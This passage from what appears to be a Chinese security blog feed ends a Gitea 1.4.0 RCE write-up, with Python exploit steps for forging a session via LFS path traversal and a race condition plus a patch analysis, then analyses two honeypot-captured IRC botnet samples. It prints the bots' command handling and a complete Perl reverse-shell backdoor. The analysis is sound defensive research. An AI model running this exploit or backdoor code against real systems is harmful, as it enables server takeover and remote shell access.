&lt;p&gt;这段序列里就包含了session信息，包括 &lt;code&gt;_old_iod&lt;/code&gt; &lt;code&gt;uid&lt;/code&gt; &lt;code&gt;uname&lt;/code&gt;，然后我们可以利用这个伪造的&lt;code&gt;session&lt;/code&gt;成功登录&lt;/p&gt;

&lt;h3 id=&#34;0x06-漏洞利用&#34;&gt;0x06 漏洞利用&lt;/h3&gt;

&lt;h5 id=&#34;1-读取-app-ini-获得-lfs-jwt-secret&#34;&gt;1. 读取&lt;code&gt;app.ini&lt;/code&gt;，获得&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531882119588.png&#34; alt=&#34;1531882119588&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-针对-session-文件名创建-lfs-对象&#34;&gt;2. 针对&lt;code&gt;session&lt;/code&gt;文件名创建&lt;code&gt;LFS&lt;/code&gt;对象&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def create_lfs_object(session):
    oid = &#39;....gitea/sessions/1/1/11session&#39;
    data = {
        &amp;quot;Oid&amp;quot;: oid,
        &amp;quot;Size&amp;quot;: 1000,
        &amp;quot;User&amp;quot;: &amp;quot;a&amp;quot;,
        &amp;quot;Password&amp;quot;: &amp;quot;a&amp;quot;,
        &amp;quot;Repo&amp;quot;: &amp;quot;a&amp;quot;,
        &amp;quot;Authorization&amp;quot;: &amp;quot;a&amp;quot;
    }

    url = &#39;%s.git/info/lfs/objects&#39; % (GIT_URL)
    response = session.post(
        url,
        json=data,
        headers={
            &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;
        }
    )
    logging.info(response.text)
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;3-生成-authorization&#34;&gt;3. 生成&lt;code&gt;Authorization&lt;/code&gt;&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531883703859.png&#34; alt=&#34;1531883703859&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;4-生成-session-数据&#34;&gt;4. 生成&lt;code&gt;session&lt;/code&gt;数据&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531898708274.png&#34; alt=&#34;1531898708274&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;5-写入-session-数据&#34;&gt;5. 写入&lt;code&gt;session&lt;/code&gt;数据&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def write_session(session):
    oid = &#39;....gitea/sessions/1/1/11session&#39;
    url = &#39;%s.git/info/lfs/objects/%s&#39; % (GIT_URL, urllib.quote(oid, safe=&#39;&#39;))
    print url
    response = session.put(url, data=gen_data(), headers={
        &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,
        &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,
        &#39;Authorization&#39;: &#39;Bearer &#39; + AUTH_TOKEN
    })
    logging.info(response.text)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中&lt;code&gt;gen_data()&lt;/code&gt;使用生成器来延迟响应时间，在这段时间内&lt;code&gt;.tmp&lt;/code&gt;文件未被删除&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def gen_data():
    yield SESSION_DATA
    time.sleep(300)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;HEX_DATA&lt;/code&gt;是生成的&lt;code&gt;session&lt;/code&gt;数据&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;HEX_DATA = &#39;0eff81040102ff8...d696e313233&#39;	//hex_data
SESSION_DATA = HEX_DATA.decode(&#39;hex&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;6-修改session&#34;&gt;6. 修改Session&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531905605099.png&#34; alt=&#34;1531905605099&#34; /&gt;&lt;/p&gt;

&lt;p&gt;后续利用&lt;code&gt;Git Hooks&lt;/code&gt;自动执行命令就不多说了&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531905731043.png&#34; alt=&#34;1531905731043&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x07-补丁分析&#34;&gt;0x07 补丁分析&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9&#34;&gt;https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;分析补丁主要做了三块工作：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;首先把缺少的&lt;code&gt;return&lt;/code&gt;给补上了&lt;/li&gt;
&lt;li&gt;限定了&lt;code&gt;oid&lt;/code&gt;参数值必须符合&lt;code&gt;sha256&lt;/code&gt;格式，如果查询的&lt;code&gt;oid&lt;/code&gt;不存在则返回404，这样我们就无法指定任意&lt;code&gt;oid&lt;/code&gt;值&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531798747694.png&#34; alt=&#34;1531798747694&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;然后使用&lt;code&gt;path.Clean()&lt;/code&gt;方法过滤多余的&lt;code&gt;.&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;，限制&lt;code&gt;repo&lt;/code&gt;里不能出现&lt;code&gt;.&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;字符&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531804973465.png&#34; alt=&#34;1531804973465&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531804989614.png&#34; alt=&#34;1531804989614&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x08-总结&#34;&gt;0x08 总结&lt;/h3&gt;

&lt;p&gt;该漏洞利用非常巧妙，由一处缺少的&lt;code&gt;return&lt;/code&gt;层层深入，从权限绕过到文件读取，从伪造session到条件竞争，到最后的远程代码执行，一条漏洞链就串起来了，可谓十分精彩，也从侧面反映了一处小疏忽也会导致严重的后果。&lt;/p&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html&#34;&gt;https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html&#34;&gt;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>两款IRC Bot的分析</title>
      <link>https://kylingit.com/blog/%E4%B8%A4%E6%AC%BEirc-bot%E7%9A%84%E5%88%86%E6%9E%90/</link>
      <pubDate>Wed, 06 Jun 2018 10:01:49 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/%E4%B8%A4%E6%AC%BEirc-bot%E7%9A%84%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;近期在蜜罐上捕获到两个利用RCE漏洞传播的远控木马，经过分析判断是基于IRC协议的bot样本，分别是使用php编写的&lt;code&gt;Pbot&lt;/code&gt;和使用Perl版的&lt;code&gt;Perl IrcBot&lt;/code&gt;，下面简单分析一下这两个脚本。&lt;/p&gt;

&lt;h2 id=&#34;0x01-irc协议简介&#34;&gt;0x01 IRC协议简介&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;IRC是Internet Relay Chat 的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。经过十年的发展，目前世界上有超过60个国家提供了IRC的服务。IRC的工作原理非常简单，您只要在自己的PC上运行客户端软件，然后通过因特网以IRC协议连接到一台IRC服务器上即可。它的特点是速度非常之快，聊天时几乎没有延迟的现象，并且只占用很小的带宽资源。所有用户可以在一个被称为Channel（频道）的地方就某一话题进行交谈或密谈。每个IRC的使用者都有一个Nickname（昵称）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;基础IRC指令如下表，更详细的可以参考&lt;a href=&#34;https://github.com/sulit/docs/blob/master/src/irc/irc.md&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;注释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;/join #&lt;channel&gt;&lt;/td&gt;
&lt;td&gt;加入名为channel的频道。所有频道名均以&amp;rsquo;#&amp;lsquo;开头。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;/part #&lt;channel&gt;&lt;/td&gt;
&lt;td&gt;离开名为channel的频道。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;/nick &lt;NewNick&gt;&lt;/td&gt;
&lt;td&gt;将你当前的昵称改为NewNick。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;/me &lt;action&gt;&lt;/td&gt;
&lt;td&gt;在当前频道显示某个动作（举个例子，/me waves会显示&amp;rdquo;*JohnSmith waves&amp;rdquo;。）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;/away &lt;Message&gt;&lt;/td&gt;
&lt;td&gt;将你的状态标记为&amp;rdquo;Away&amp;rdquo;（离开），并向任何给你发消息的人发送内容为Message的信息。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;/msg &lt;nick&gt;&lt;message&gt;&lt;/td&gt;
&lt;td&gt;向名为nick的用户发送内容为message的私信。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;/quit&lt;/td&gt;
&lt;td&gt;终止IRC连接。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;在这两个bot中用到的比较关键的是&lt;code&gt;PRIVMSG &lt;/code&gt;指令，指的是Private Message（私密消息），它的基本格式类似这样：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;:Nick!user@host PRIVMSG destination :Message&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;黑客利用IRC协议与被控主机通信，C&amp;amp;C发送的指令就是这种格式，bot根据PRIVMSG后的Message进行相应操作，大致过程如下图所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Snipaste_20180605_111020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;环境准备&#34;&gt;环境准备&lt;/h3&gt;

&lt;p&gt;我们在本地Ubuntu系统搭建一个IRC服务器，用来模拟样本与C&amp;amp;C的通信。&lt;/p&gt;

&lt;p&gt;1.搭建IRC服务器&lt;/p&gt;

&lt;p&gt;&lt;code&gt;apt-get install inspircd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;修改配置文件&lt;code&gt;vim /etc/inspircd/inspircd.conf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;修改&lt;code&gt;bind address&lt;/code&gt;监听在&lt;code&gt;0.0.0.0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;启动服务&lt;code&gt;service inspircd start&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;2.使用mIRC软件模拟通信&lt;/p&gt;

&lt;p&gt;在Windows下面可以使用mIRC软件进行irc通信，&lt;a href=&#34;https://www.mirc.com/get.html&#34;&gt;下载地址&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;创建一个IRC Servers &lt;code&gt;irc.local&lt;/code&gt;，地址为&lt;code&gt;192.168.3.195&lt;/code&gt;，密码可以为空&lt;/p&gt;

&lt;p&gt;连接上本地IRC服务器后我们创建一个channel，叫做&lt;code&gt;#php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528252223926.png&#34; alt=&#34;1528252223926&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这样就加入了&lt;code&gt;#php&lt;/code&gt;channel&lt;/p&gt;

&lt;h2 id=&#34;0x02-pbot&#34;&gt;0x02 Pbot&lt;/h2&gt;

&lt;p&gt;Pbot是使用php编写的IrcBot&lt;/p&gt;

&lt;h3 id=&#34;连接配置&#34;&gt;连接配置&lt;/h3&gt;

&lt;p&gt;我们修改bot的连接配置，其中&lt;code&gt;hostauth&lt;/code&gt;是受信任的控制端，黑客会设置为自己的ip，我们将之设置为&lt;code&gt;*&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$cfg = array(
    &amp;quot;server&amp;quot; =&amp;gt; &amp;quot;192.168.3.195&amp;quot;,	//irc服务器地址
    &amp;quot;port&amp;quot; =&amp;gt; &amp;quot;6667&amp;quot;,
    &amp;quot;key&amp;quot; =&amp;gt; &amp;quot;&amp;quot;,
    &amp;quot;prefix&amp;quot; =&amp;gt; &amp;quot;&amp;quot;,
    &amp;quot;maxrand&amp;quot; =&amp;gt; &amp;quot;8&amp;quot;,
    &amp;quot;chan&amp;quot; =&amp;gt; &amp;quot;#php&amp;quot;,				//加入的频道
    &amp;quot;trigger&amp;quot; =&amp;gt; &amp;quot;.&amp;quot;,				//指令分隔符
    &amp;quot;hostauth&amp;quot; =&amp;gt; &amp;quot;*&amp;quot;				//受信任的远程主机，修改为*
);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后可以增加一行语句来输出当前的connection状态，方便查看&lt;/p&gt;

&lt;p&gt;&lt;code&gt;echo fgets($this-&amp;gt;conn, 512);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;初始化阶段bot先设置好一些信息，例如服务器ip、端口等&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function start($cfg)
{
    $this-&amp;gt;config = $cfg;
    while (true) {
        if (!($this-&amp;gt;conn = fsockopen($this-&amp;gt;config[&#39;server&#39;], $this-&amp;gt;config[&#39;port&#39;], $e, $s, 30)))
            $this-&amp;gt;start($cfg);
        $ident = $this-&amp;gt;config[&#39;prefix&#39;];
        $alph = range(&amp;quot;0&amp;quot;, &amp;quot;9&amp;quot;);
        for ($i = 0; $i &amp;lt; $this-&amp;gt;config[&#39;maxrand&#39;]; $i++)
            $ident .= $alph[rand(0, 9)];
        $this-&amp;gt;send(&amp;quot;USER &amp;quot; . $ident . &amp;quot; 127.0.0.1 localhost :&amp;quot; . php_uname() . &amp;quot;&amp;quot;);
        $this-&amp;gt;set_nick();
        $this-&amp;gt;main();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;随后bot会设置一个随机名称加入相应的channel&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528252610192.png&#34; alt=&#34;1528252610192&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在IRC聊天室也能看到bot上线&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528252650212.png&#34; alt=&#34;1528252650212&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;功能分析&#34;&gt;功能分析&lt;/h3&gt;

&lt;p&gt;当连接建立后，bot会持续监听socket信息，然后根据C&amp;amp;C发送的指令进行响应&lt;/p&gt;

&lt;p&gt;支持的指令有如下几种&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.user &lt;password&gt;&lt;/strong&gt; 用于登录bot，以便它接受其他命令。密码即为初始配置的密码，只有登录成功后才能进行后续指令下发操作&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.logout&lt;/strong&gt; 注销bot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.die&lt;/strong&gt; 关闭与IRC服务器的连接&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.restart&lt;/strong&gt; 重启bot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.mail &lt;to&gt; &lt;from&gt; &lt;subject&gt; &lt;msg&gt;&lt;/strong&gt;  发送邮件，调用php的&lt;code&gt;mail()&lt;/code&gt;函数，可以用来发送垃圾邮件&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.dns &lt;domain&gt;&lt;/strong&gt;进行DNS查询&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.download &lt;URL&gt; &lt;filename&gt;&lt;/strong&gt; 下载文件&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.exec &lt;command&gt;&lt;/strong&gt; 使用&lt;code&gt;exec()&lt;/code&gt;函数执行命令&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.cmd &lt;command&gt;&lt;/strong&gt; 使用&lt;code&gt;popen()&lt;/code&gt;函数执行命令&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.info&lt;/strong&gt; 获取系统信息&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.php &lt;php code&gt;&lt;/strong&gt;  使用&lt;code&gt;eval()&lt;/code&gt;函数执行php代码&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.tcpflood &lt;target&gt; &lt;packets&gt; &lt;packetsize&gt; &lt;port&gt; &lt;delay&gt;&lt;/strong&gt; TCP Flood攻击&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.udpflood &lt;target&gt; &lt;packets&gt; &lt;packetsize&gt; &lt;delay&gt;&lt;/strong&gt; UDP Flood洪水攻击&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.raw &lt;cmd&gt;&lt;/strong&gt; 原始IRC命令&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.rndnick&lt;/strong&gt; 更改bot昵称&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.pscan &lt;host&gt; &lt;port&gt;&lt;/strong&gt; 端口扫描&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.safe&lt;/strong&gt; 测试&lt;code&gt;safe_mode&lt;/code&gt;是否开启&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.inbox &lt;to&gt;&lt;/strong&gt; 测试收件箱&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;.conback &lt;ip&gt; &lt;port&gt;&lt;/strong&gt; 创建一个perl脚本并执行，可以反弹shell。&lt;/p&gt;

&lt;p&gt;我们分析一下其中的几个指令&lt;/p&gt;

&lt;p&gt;控制端在聊天室发送消息，指令需要以&lt;code&gt;.&lt;/code&gt;开头，因为下面会根据分隔符&lt;code&gt;.&lt;/code&gt;来取出实际命令&lt;/p&gt;

&lt;p&gt;实际传输的指令是这样的格式&lt;/p&gt;

&lt;p&gt;&lt;code&gt;:test!test@192.168.3.193 PRIVMSG #php :.command&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;bot会根据PRIVMSG后面的&lt;code&gt;.command&lt;/code&gt;进入相应的分支&lt;/p&gt;

&lt;h4 id=&#34;uname&#34;&gt;uname&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528254954215.png&#34; alt=&#34;1528254954215&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528254899287.png&#34; alt=&#34;1528254899287&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在进入对应指令的分支之前先判断当前连接的irc服务器是否在&lt;code&gt;hostauth&lt;/code&gt;列表，这决定了bot是否接受控制&lt;/p&gt;

&lt;p&gt;再一个就是以&lt;code&gt;.&lt;/code&gt;来作为指令的起始符，这里应该取配置中的&lt;code&gt;trigger&lt;/code&gt;变量，但是此处被硬编码为&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;随后便进入&lt;code&gt;uname&lt;/code&gt;分支调用&lt;code&gt;php_uname()&lt;/code&gt;方法&lt;/p&gt;

&lt;h4 id=&#34;exec-cmd&#34;&gt;exec&amp;amp;cmd&lt;/h4&gt;

&lt;p&gt;执行命令部分有两块可以实现，分别是exec和cmd&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528255190724.png&#34; alt=&#34;1528255190724&#34; /&gt;&lt;/p&gt;

&lt;p&gt;其中exec直接调用php内置的exec命令，cmd则是通过自定义方法&lt;code&gt;Exe()&lt;/code&gt;执行，在&lt;code&gt;Exe()&lt;/code&gt;方法内部对系统支持的命令执行函数进行了判断，可以通过以下几种方法使命令得到最终执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528255437456.png&#34; alt=&#34;1528255437456&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;pscan&#34;&gt;pscan&lt;/h4&gt;

&lt;p&gt;可以探测指定ip的端口是否开放&lt;/p&gt;

&lt;p&gt;&lt;code&gt;.pscan ip port&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528271275578.png&#34; alt=&#34;1528271275578&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;conback&#34;&gt;conback&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;conback &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528270109767.png&#34; alt=&#34;1528270109767&#34; /&gt;&lt;/p&gt;

&lt;p&gt;该指令会在尝试在&lt;code&gt;/tmp/&lt;/code&gt;和&lt;code&gt;/var/tmp&lt;/code&gt;写入脚本，脚本使用perl语言编写并经过base64编码，执行后会向指定ip反弹一个shell，在连接断开后脚本自动删除。脚本内容如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl
use Socket;
print &amp;quot;Data Cha0s Connect Back Backdoor\n\n&amp;quot;;
if (!$ARGV[0]) {
  printf &amp;quot;Usage: $0 [Host] &amp;lt;Port&amp;gt;\n&amp;quot;;
  exit(1);
}
print &amp;quot;[*] Dumping Arguments\n&amp;quot;;
$host = $ARGV[0];
$port = 80;
if ($ARGV[1]) {
  $port = $ARGV[1];
}
print &amp;quot;[*] Connecting...\n&amp;quot;;
$proto = getprotobyname(&#39;tcp&#39;) || die(&amp;quot;Unknown Protocol\n&amp;quot;);
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die (&amp;quot;Socket Error\n&amp;quot;);
my $target = inet_aton($host);
if (!connect(SERVER, pack &amp;quot;SnA4x8&amp;quot;, 2, $port, $target)) {
  die(&amp;quot;Unable to Connect\n&amp;quot;);
}
print &amp;quot;[*] Spawning Shell\n&amp;quot;;
if (!fork( )) {
  open(STDIN,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
  open(STDOUT,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
  open(STDERR,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
  exec {&#39;/bin/sh&#39;} &#39;-bash&#39; . &amp;quot;\0&amp;quot; x 4;
  exit(0);
}
print &amp;quot;[*] Datached\n\n&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;测试了几个功能都是可以正常使用的，如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528269072874.png&#34; alt=&#34;1528269072874&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在数据包中也能清楚地看到交互过程&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528270676034.png&#34; alt=&#34;1528270676034&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;0x03-ddos-perl-ircbot&#34;&gt;0x03 DDoS Perl IrcBot&lt;/h2&gt;

&lt;p&gt;基于Perl编写的IrcBot功能大致与Pbot相同，不过实现方式有些不一样&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528274109719.png&#34; alt=&#34;1528274109719&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从bot的帮助信息来看是支持不少指令的，主要分为以下几个功能模块&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;!u @system 	# 系统模块
!u @version	# 版本信息
!u @channel	# IRC频道操作模块
!u @flood  	# DDoS模块
!u @utils  	# 其它功能模块
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;连接配置-1&#34;&gt;连接配置&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;$server = &#39;192.168.3.195&#39; unless $server;	# 服务器ip，如果$server不存在则默认
my $port = &#39;6667&#39;;	# 端口

my $linas_max=&#39;8&#39;;
my $sleep=&#39;5&#39;;

my $homedir = &amp;quot;/tmp&amp;quot;;	#工作目录
my $version = &#39;gztest v1&#39;; 

my @admins = (&amp;quot;test&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;root1&amp;quot;,&amp;quot;root2&amp;quot;,&amp;quot;root3&amp;quot;,&amp;quot;root4&amp;quot;); # 管理员
my @hostauth = (&amp;quot;192.168.3.193&amp;quot;); 	# 管理员ip
my @channels = (&amp;quot;#Perl&amp;quot;); 	# IRC频道
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样的，我们在&lt;code&gt;192.168.3.195&lt;/code&gt;IRC服务器上创建一个&lt;code&gt;#Perl&lt;/code&gt;频道，运行后能看到bot上线&lt;/p&gt;

&lt;h3 id=&#34;功能分析-1&#34;&gt;功能分析&lt;/h3&gt;

&lt;h4 id=&#34;数据包&#34;&gt;数据包&lt;/h4&gt;

&lt;p&gt;抓取数据包看一下IrcBot与IRC服务器之间的通信&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528274862059.png&#34; alt=&#34;1528274862059&#34; /&gt;&lt;/p&gt;

&lt;p&gt;发送消息部分是和Pbot是一样的，Pbot是通过起始符(&lt;code&gt;.&lt;/code&gt;)来提取具体指令，而在Perl IrcBot内部则是通过正则表达式来完成，即&lt;code&gt;parse&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528275278915.png&#34; alt=&#34;1528275278915&#34; /&gt;&lt;/p&gt;

&lt;p&gt;随后根据具体指令执行相应的功能&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;if (grep {$_ =~ /^\Q$hostmask\E$/i} @hostauth) {
    if (grep {$_ =~ /^\Q$pn\E$/i} @admins) {	# 判断当前ip和用户是否是管理员
        if ($onde eq &amp;quot;$meunick&amp;quot;) {
            shell(&amp;quot;$pn&amp;quot;, &amp;quot;$args&amp;quot;);
        }
        if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {			# 三种方法来执行功能
                ircase(&amp;quot;$pn&amp;quot;, &amp;quot;$onde&amp;quot;, &amp;quot;$1&amp;quot;);
            }
            elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc(&amp;quot;$ondep&amp;quot;, &amp;quot;$1&amp;quot;);			# help/irc/ddos/shell等功能
            }
            else {
                shell(&amp;quot;$onde&amp;quot;, &amp;quot;$arg&amp;quot;);
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;bfunc&lt;/code&gt;方法作为最主要的模块，包含了4部分功能&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;帮助信息&lt;/strong&gt;  显示脚本帮助信息；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IRC频道操作&lt;/strong&gt;  包括加入退出频道，更改昵称，邀请朋友等；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DDoS模块&lt;/strong&gt;  包括TCP Flood、UDP Flood、HTTP DDoS等功能；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;渗透辅助功能&lt;/strong&gt;   包括执行命令、反弹shell、端口扫描、文件下载等功能；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中&lt;code&gt;ircase&lt;/code&gt;是相应的在IRC频道中的操作&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528276673338.png&#34; alt=&#34;1528276673338&#34; /&gt;&lt;/p&gt;

&lt;p&gt;用图形来表示bot的主要功能如下图所示&lt;/p&gt;

